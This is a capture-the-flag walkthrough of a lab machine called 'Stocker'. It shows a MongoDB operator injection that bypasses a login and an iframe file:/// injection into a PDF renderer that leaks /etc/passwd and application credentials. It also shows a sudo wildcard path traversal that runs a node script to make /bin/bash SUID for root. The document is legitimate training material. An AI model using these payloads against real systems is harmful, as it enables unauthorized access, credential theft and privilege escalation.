# Stocker

## Gaining Access

Nmap scan:

```bash
$ nmap -p- --min-rate 3000 10.129.98.240 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 00:30 EST
Nmap scan report for stocker.htb (10.129.98.240)
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The domain was `stocker.htb`, and we can add that to the `/etc/hosts` file.

### Subdomain Fuzzing

There was nothing of interest on the website. `gobuster` scans and default enumeration did not really help out a lot.&#x20;

I decided to use `wfuzz` to fuzz the possible subdomains present on the website, and actually found one at `dev.stocker.htb`.

<figure><img src="../../../.gitbook/assets/image (3412).png" alt=""><figcaption></figcaption></figure>

Interesting.

### Login Bypass

At the dev site, all we see is one login page:

<figure><img src="../../../.gitbook/assets/image (3524).png" alt=""><figcaption></figcaption></figure>

I tested out `sqlmap` or other SQL injections but it didn't work. It seems that we have to bypass this login to carry on with the machine. Proxying the traffic via Burp gave me a clearer picture on the error received when I entered wrong credentials:

```http
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3Akg1SjHeFtX5eT0qfyd1SYLx_R3NRwNQ4.1K3jgUazClJr3WYMiGo9H9WoN6Di9M3ZGN4z9qgzMXU
Upgrade-Insecure-Requests: 1

username=test&password=test
```

There was a `connect.sid` endpoint, indicating that this was some type of Express website. Perhaps this was using MongoDB instead of regular SQL. I tested this JSON payload to bypass the login and it worked.

```json
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
```

<figure><img src="../../../.gitbook/assets/image (2691).png" alt=""><figcaption></figcaption></figure>

The website was some ordering website where we could place orders for items.

<figure><img src="../../../.gitbook/assets/image (2279).png" alt=""><figcaption></figcaption></figure>

### Stock LFI

I added some items and attemted to checkout from the website.

<figure><img src="../../../.gitbook/assets/image (735).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2792).png" alt=""><figcaption></figcaption></figure>

Viewing the purchase order brought us to a PDF page.

<figure><img src="../../../.gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

I downloaded the PDF and used `exiftool` on it to find that Skia is used to generate this PDF from Chromium.

```
$ exiftool document.pdf
ExifTool Version Number         : 12.49
File Name                       : document.pdf
Directory                       : .
File Size                       : 38 kB
File Modification Date/Time     : 2023:01:17 04:05:40-05:00
File Access Date/Time           : 2023:01:17 04:05:50-05:00
File Inode Change Date/Time     : 2023:01:17 04:05:40-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:01:17 09:05:09+00:00
Modify Date                     : 2023:01:17 09:05:09+00:00
```

Additionally, this was the request sent when we clicked checkout.

```http
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 162
Connection: close
Cookie: connect.sid=s%3Akg1SjHeFtX5eT0qfyd1SYLx_R3NRwNQ4.1K3jgUazClJr3WYMiGo9H9WoN6Di9M3ZGN4z9qgzMXU

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

The exploit is obviously to do with some parameter within the request being vulnerable when generating the RCE. I did some research on PDF related exploits, and found that it was possible to inject some HTML frames to cause an LFI.

{% embed url="https://techkranti.com/ssrf-aws-metadata-leakage/" %}

I attempted this exploit using the `file:///` wrapper to read the `/etc/passwd` file and it worked within the `title` header in the JSON data.

```
<iframe src='file:///etc/passwd' width=500px height=1000px ></iframe>
```

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1557).png" alt=""><figcaption></figcaption></figure>

We find that the user is called `angoose`. I attempted to read more files such as the private SSH key of the user, but it seems that I either could not read it or it did not exist.

Remembering that this was an Express website, perhaps there was a Javascript file that I could read to find some credentials, particularly those used to access this server in the first place. WIthin  the `/var/www/dev/index.js` file, I managed to find some credentials.

<figure><img src="../../../.gitbook/assets/image (1072).png" alt=""><figcaption></figcaption></figure>

With this password, we can `ssh` in as `angoose`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1993).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo

Checking sudo permissions, we find that `angoose` can use `node` as an administrator. There's also a wildcard in the scripts we can execute, which is never a good thing.

```
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Sorry, try again.
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

Within that folder, there are some scripts already present.

```
angoose@stocker:/usr/local/scripts$ ls -la
total 32
drwxr-xr-x  3 root root 4096 Dec  6 10:33 .
drwxr-xr-x 11 root root 4096 Dec  6 10:33 ..
-rwxr-x--x  1 root root  245 Dec  6 09:53 creds.js
-rwxr-x--x  1 root root 1625 Dec  6 09:53 findAllOrders.js
-rwxr-x--x  1 root root  793 Dec  6 09:53 findUnshippedOrders.js
drwxr-xr-x  2 root root 4096 Dec  6 10:33 node_modules
-rwxr-x--x  1 root root 1337 Dec  6 09:53 profitThisMonth.js
-rwxr-x--x  1 root root  623 Dec  6 09:53 schema.js
```

I don't have write permissions in this folder. Neither can I read the scripts to find out what they do. However, because there's a wildcard, we can just enter `../../` to execute any script we want.

Here's a basic JS script for RCE using `child_process`.

```javascript
#!/usr/bin/node
require('child_process').exec('chmod u+s /bin/bash')
```

Then, we can simply do this:

```
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../../home/angoose/evil.js 
angoose@stocker:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
angoose@stocker:~$ /bin/bash -p
bash-5.0# id
uid=1001(angoose) gid=1001(angoose) euid=0(root) groups=1001(angoose)
```

Pwned.&#x20;
